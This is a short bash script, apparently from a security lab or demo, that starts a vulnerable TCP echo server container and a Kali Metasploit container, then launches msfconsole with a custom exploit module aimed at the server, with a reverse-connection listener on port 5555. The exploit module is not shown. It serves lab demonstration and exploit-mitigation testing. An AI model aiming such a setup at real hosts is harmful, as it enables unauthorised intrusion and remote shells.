#!/bin/bash

declare -r loc=kali-metasploit
declare -r rem=tcp-echo-server.alpine

# Get rid of any hangers-on
docker rm -f $loc $rem 2>/dev/null

# Start the remote target and get its IP address
docker run -dt --rm --name $rem polyverse/$rem:4079c32c8cc563d7acb0644178c286c4dbc23fb1
RHOST=$(docker exec -it $rem tail -n1 /etc/hosts | awk '{print $1}')

# Get the IP address of the attacker (that we will hopefully get again)
LHOST=$(docker run -it polyverse/$loc tail -n1 /etc/hosts | awk '{print $1}')

# Start metasploit and hope we get the same IP address.
docker run -it --rm --name $loc -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse/$loc msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT 8080; set LHOST $LHOST; set LPORT 5555"
